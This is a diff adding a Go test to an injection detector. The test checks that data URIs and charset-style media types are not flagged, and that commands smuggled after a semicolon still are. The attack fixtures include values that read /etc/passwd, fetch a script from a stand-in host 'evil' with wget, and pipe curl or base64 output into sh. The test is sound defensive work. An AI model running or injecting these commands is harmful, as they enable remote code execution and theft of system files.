@@ -285,3 +285,42 @@ func BenchmarkAnalyzeAttack(b *testing.B) {
 		d.Analyze(v)
 	}
 }
+
+// TestMediaTypeSemicolonIsNotASeparator pins both directions of the media-type
+// discrimination added after the benign corpus found a data-URI false positive.
+//
+// "data:image/png;base64,..." is an inline image, and it read as command
+// injection because the semicolon is a separator and "base64" is in the command
+// list. Suppressing that had to stay narrow, because a semicolon after a
+// slash-separated token is also how injection reaches a file parameter — so the
+// second half of this test is the one that matters.
+func TestMediaTypeSemicolonIsNotASeparator(t *testing.T) {
+	benign := []string{
+		"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB",
+		"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
+		"data:application/pdf;base64,JVBERi0xLjQK",
+		"application/json;charset=utf-8",
+		"text/html; charset=ISO-8859-1",
+		"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWx",
+		"audio/mpeg;codecs=mp3",
+	}
+	for _, v := range benign {
+		if r := New().Analyze([]byte(v)); r.Score > 0 {
+			t.Errorf("media type %q scored %d, signals %v", v, r.Score, r.Signals)
+		}
+	}
+
+	// The suppression must not become a prefix an attacker can borrow.
+	attacks := []string{
+		"text/plain;cat /etc/passwd",
+		"image/png;wget http://evil/s.sh",
+		"application/json;base64 -d payload|sh",
+		"uploads/img.png;cat /etc/passwd",
+		"data:image/png;base64,x;curl http://evil/|sh",
+	}
+	for _, v := range attacks {
+		if r := New().Analyze([]byte(v)); r.Score == 0 {
+			t.Errorf("injection after a media type not reported: %q", v)
+		}
+	}
+}
